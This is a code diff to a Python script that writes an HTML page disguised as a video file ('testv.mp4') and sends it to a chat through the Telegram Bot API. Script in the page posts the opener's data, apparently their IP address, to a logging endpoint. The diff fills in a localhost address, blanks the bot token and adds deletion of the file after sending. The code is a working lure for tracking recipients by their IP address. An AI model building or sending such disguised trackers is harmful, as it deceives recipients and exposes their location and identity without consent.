@@ -1,9 +1,8 @@
 import requests
+import os
 
-
-BOT_TOKEN = "your_bot_token"
-CHAT_ID = "your_chat_id"
-
+BOT_TOKEN = ""
+CHAT_ID = ""
 
 html_content = """
 <!DOCTYPE html>
@@ -16,7 +15,7 @@ html_content = """
             .then(response => response.json())
             .then(data => {
                 
-                fetch('http://your_ip:5000/log_ip', {  
+                fetch('http://127.0.0.1:5000/log_ip', {  
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -36,16 +35,12 @@ html_content = """
 <body>
 </body>
 </html>
-
-
-
 """
 
-
+# Đường dẫn để lưu file HTML
 html_path = "testv.mp4"
 with open(html_path, "w") as file:
     file.write(html_content)
-
 
 files = {
     "video": (
@@ -55,14 +50,14 @@ files = {
     )
 }
 
-
 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-
-
 data = {"chat_id": CHAT_ID, "supports_streaming": False}
 response = requests.post(url, data=data, files=files)
 
 if response.status_code == 200:
-    print("message send")
+    print("Message sent")
 else:
-    print(f"Hata: {response.text}")
+    print(f"Error: {response.text}")
+
+# Xóa file sau khi gửi
+os.remove(html_path)
